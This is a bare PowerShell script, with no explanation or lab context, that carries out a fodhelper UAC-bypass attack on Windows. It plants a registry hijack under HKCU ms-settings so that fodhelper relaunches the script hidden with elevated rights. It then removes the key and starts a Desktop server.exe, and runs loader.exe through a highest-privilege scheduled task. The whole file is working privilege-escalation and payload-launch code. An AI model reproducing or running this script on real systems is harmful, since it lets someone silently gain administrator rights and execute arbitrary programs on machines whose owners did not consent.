$scriptPath = $MyInvocation.MyCommand.Path
$serverExe = "$env:USERPROFILE\Desktop\server.exe"  
$loaderExe = "$env:USERPROFILE\Desktop\loader.exe"
$oneShotTask = 'OneShotLoader'

$principal = New-Object Security.Principal.WindowsPrincipal(
  [Security.Principal.WindowsIdentity]::GetCurrent()
)
$isAdmin = $principal.IsInRole(
  [Security.Principal.WindowsBuiltInRole]::Administrator
)

if (-not $isAdmin) {
    Write-Host '[*] Not elevated => setting up fodhelper hijack…'

    $baseKey = 'HKCU:\Software\Classes\ms-settings\shell\open\command'
    New-Item -Path $baseKey -Force | Out-Null
    Set-ItemProperty -Path $baseKey -Name '(default)' `
        -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Force
    New-ItemProperty -Path $baseKey -Name DelegateExecute -Value '' -Force | Out-Null

    Start-Process 'fodhelper.exe'
    exit
}

Write-Host '[+] Running elevated…'

$baseKey = 'HKCU:\Software\Classes\ms-settings\shell\open\command'
Remove-Item -Path $baseKey -Recurse -ErrorAction SilentlyContinue

Write-Host "[+] Launching server.exe ? $serverExe"
Start-Process -FilePath $serverExe -NoNewWindow

$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(3)
$action  = New-ScheduledTaskAction  -Execute $loaderExe

Register-ScheduledTask -TaskName $oneShotTask -Trigger $trigger -Action $action -RunLevel Highest -Force

Start-ScheduledTask -TaskName $oneShotTask

Write-Host "[+] Exploiting!"
